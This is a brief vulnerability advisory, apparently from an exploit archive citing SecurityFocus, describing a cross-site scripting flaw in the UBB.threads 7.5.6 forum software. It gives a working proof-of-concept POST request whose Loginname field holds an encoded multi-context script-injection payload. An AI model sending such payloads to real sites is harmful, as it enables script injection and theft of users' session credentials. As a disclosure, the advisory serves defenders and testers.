@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/51275/info
+
+UBB.threads is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+UBB.threads 7.5.6 is vulnerable; other versions may also be affected. 
+
+The following exploit data is available:
+
+http://www.example.com/forums/ubbthreads.php/ubb/login/lostpw/1
+
+POST /forums/ubbthreads.php
+ubb=start_page&Loginname=%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%27%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F%5C%22%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E&Email=&buttforgot=I+forgot+my+password
+
